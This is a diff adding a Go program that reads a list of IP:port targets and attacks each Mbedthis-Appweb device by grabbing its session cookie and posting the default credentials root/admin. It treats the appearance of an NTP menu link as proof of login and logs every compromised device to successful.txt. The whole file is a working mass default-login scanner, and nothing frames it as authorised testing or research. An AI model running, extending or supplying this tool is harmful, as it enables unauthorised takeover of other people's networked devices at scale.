@@ -1,0 +1,188 @@
+/*
+
+Server: Mbedthis-Appweb/2.4.2
+
+*/
+
+
+package main
+
+import (
+    "fmt"
+    "io/ioutil"
+    "net/http"
+    "strings"
+    "os"
+    "time"
+)
+
+func main() {
+    // Read the IP addresses and ports from ips.txt
+    ipPortData, err := ioutil.ReadFile("ips.txt")
+    if err != nil {
+    //    fmt.Println("Error reading ips.txt:", err)
+        return
+    }
+
+    // Split the contents of ips.txt into individual lines
+    ipPortLines := strings.Split(string(ipPortData), "\n")
+
+    // Create an HTTP client with a timeout
+    client := &http.Client{
+        Timeout: 10 * time.Second, // Adjust the timeout as needed
+    }
+
+    // Iterate over each line in ips.txt
+    for _, ipPort := range ipPortLines {
+        ipPort = strings.TrimSpace(ipPort)
+
+        // Skip empty lines or lines that don't contain IP:Port data
+        if ipPort == "" {
+            continue
+        }
+
+        processIP(client, ipPort)
+    }
+}
+
+func processIP(client *http.Client, ipPort string) {
+    // Define the request parameters
+    url := "http://" + ipPort + "/index.html"
+    method := "GET"
+    headers := map[string]string{
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
+        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding":           "gzip, deflate",
+        "Accept-Language":           "en-US,en;q=0.9",
+        "Connection":                "close",
+    }
+
+    // Create a new request
+    req, err := http.NewRequest(method, url, nil)
+    if err != nil {
+       // fmt.Println("Error creating request:", err)
+        return
+    }
+
+    // Set request headers
+    for key, value := range headers {
+        req.Header.Add(key, value)
+    }
+
+    // Send the request with timeout
+    resp, err := client.Do(req)
+    if err != nil {
+        if err.Error() == "net/http: request canceled" {
+            // Timeout error, continue to the next IP:Port
+            fmt.Printf("Timeout for %s\n", ipPort)
+            return
+        }
+       // fmt.Println("Error sending request:", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    // Extract the value of the "_appwebSessionId_" cookie from the GET response
+    sessionCookie := resp.Header.Get("Set-Cookie")
+    appwebSessionID := extractAppwebSessionID(sessionCookie)
+
+    // Define the POST request parameters
+    postURL := "http://" + ipPort + "/index.html"
+    postMethod := "POST"
+    postHeaders := map[string]string{
+        "Cache-Control":             "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "Origin":                    "http://" + ipPort,
+        "Content-Type":              "application/x-www-form-urlencoded",
+        "User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
+        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Referer":                   "http://" + ipPort + "/index.html",
+        "Accept-Encoding":           "gzip, deflate",
+        "Accept-Language":           "en-US,en;q=0.9",
+        "Cookie":                    "_appwebSessionId_=" + appwebSessionID,
+        "Connection":                "close",
+    }
+
+    // Define the POST data
+    postData := "username=root&password=admin"
+
+    // Calculate the Content-Length header for the POST request
+    postHeaders["Content-Length"] = fmt.Sprintf("%d", len(postData))
+
+    // Create a new POST request
+    postRequest, err := http.NewRequest(postMethod, postURL, strings.NewReader(postData))
+    if err != nil {
+      //  fmt.Println("Error creating POST request:", err)
+        return
+    }
+
+    // Set POST request headers
+    for key, value := range postHeaders {
+        postRequest.Header.Add(key, value)
+    }
+
+    // Send the POST request with timeout
+    postResp, err := client.Do(postRequest)
+    if err != nil {
+        if err.Error() == "net/http: request canceled" {
+            // Timeout error, continue to the next IP:Port
+          //  fmt.Printf("Timeout for %s\n", ipPort)
+            return
+        }
+      //  fmt.Println("Error sending POST request:", err)
+        return
+    }
+    defer postResp.Body.Close()
+
+    // Read the response body of the POST request
+    responseBody, err := ioutil.ReadAll(postResp.Body)
+    if err != nil {
+       // fmt.Println("Error reading response body:", err)
+        return
+    }
+
+    // Check if the response body contains the success marker
+    if strings.Contains(string(responseBody), "<li><a href=\"/NTP.html\">NTP</a></li>") {
+        // Write the successful IP:Port to successful.txt
+        writeToFile("successful.txt", ipPort)
+        fmt.Printf("[netcom]: login successful for device: %s\n", ipPort)
+    } else {
+        fmt.Printf("[netcom]: login failed for device: %s\n", ipPort)
+    }
+}
+
+func extractAppwebSessionID(cookieHeader string) string {
+    // Split the cookie header into individual cookies
+    cookies := strings.Split(cookieHeader, ";")
+
+    // Find the "_appwebSessionId_" cookie
+    for _, cookie := range cookies {
+        if strings.Contains(cookie, "_appwebSessionId_") {
+            // Split the cookie into key and value parts
+            parts := strings.SplitN(cookie, "=", 2)
+            if len(parts) == 2 {
+                return parts[1]
+            }
+        }
+    }
+
+    // Return an empty string if the cookie is not found
+    return ""
+}
+
+func writeToFile(filename, data string) {
+    // Open the file with append mode, create if it doesn't exist
+    file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    if err != nil {
+        fmt.Println("Error opening file:", err)
+        return
+    }
+    defer file.Close()
+
+    // Write data to the file
+    _, err = file.WriteString(data + "\n")
+    if err != nil {
+        fmt.Println("Error writing to file:", err)
+    }
+}
